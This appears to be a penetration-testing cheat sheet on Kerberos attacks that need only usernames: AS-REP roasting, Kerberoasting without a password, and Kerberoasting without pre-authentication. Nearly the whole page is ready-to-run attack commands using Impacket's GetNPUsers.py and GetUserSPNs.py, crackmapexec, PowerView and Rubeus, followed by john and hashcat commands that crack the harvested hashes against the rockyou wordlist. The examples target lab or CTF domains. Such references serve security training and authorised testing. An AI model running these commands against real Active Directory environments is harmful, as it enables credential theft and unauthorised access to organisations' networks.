---
description: Kerberos attack using username only. No credential is required.
---

# Kerberos Attack w/o password

### ASREProast

AS-REP roasting is a technique that allows retrieving password hashes for users that have Do not require Kerberos preauthentication property selected.

#### Linux

{% code overflow="wrap" %}
```bash
# Get ASREProastable credentials
GetNPUsers.py rebound.htb/ -usersfile users-rebound.htb.txt -format john
GetNPUsers.py oscp.lab/ -usersfile usernames.txt -format hashcat
GetNPUsers.py brute.com/ -usersfile users-brute.com.txt -dc-ip 172.31.3.3 -format john
GetNPUsers.py blackfield.local/ -usersfile users-blackfield.local.txt  -dc-ip $RHOST -format john -outputfile ./hash-ASREP.txt

# users list dynamically queried with an LDAP anonymous bind
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/'

# With crackmapexec 
crackmapexec ldap rebound.htb -u users.txt -p '' --asreproast hash-ASREP.txt

# Crack the hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash-ASREP.txt
hashcat -m 18200 -a 0 hash-ASREP.txt /usr/share/wordlists/rockyou.txt --show
```
{% endcode %}

#### Windows

{% code overflow="wrap" %}
```bash
# Find AS-REP Roastable Users
PS> Get-DomainUser -PreauthNotRequired | select UserPrincipalName

# Windows
CMD> Rubeus.exe asreproast  /format:hashcat /outfile:hash-ASREP2.txt
```
{% endcode %}

### Kerberoast w/o password

{% code overflow="wrap" %}
```bash
# With userlist
sudo GetNPUsers.py iptracej.local/ -dc-ip 10.10.10.161 -usersfile usernames.txt

# With a single username 
GetNPUsers.py absolute.htb/d.klay -dc-ip 10.129.192.41 -no-pass -format hashcat
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```
{% endcode %}



### Kerberoast w/o pre-authentication

If an attacker knows of an account for which pre-authentication isn't required (i.e. an [ASREProastable](broken-reference) account), as well as one (or multiple) service accounts to target, a Kerberoast attack can be attempted without having to control any Active Directory account (since pre-authentication won't be required).

#### Linux

{% code overflow="wrap" %}
```bash
# ThePorgs version should be used
# 
# pipenv shell
# git clone https://github.com/ThePorgs/impacket
# cd impacket/
# pip3 install .

GetUserSPNs.py rebound.htb/ -no-preauth jjones -usersfile users.txt -target-domain rebound.htb -dc-ip $RHOST
```
{% endcode %}

#### **Windows**

{% code overflow="wrap" %}
```bash
Rubeus.exe kerberoast /nopreauth:jjones /domain:rebound.htb /dc:dc01.rebound.htb /spns:./users.txt /nowrap
```
{% endcode %}

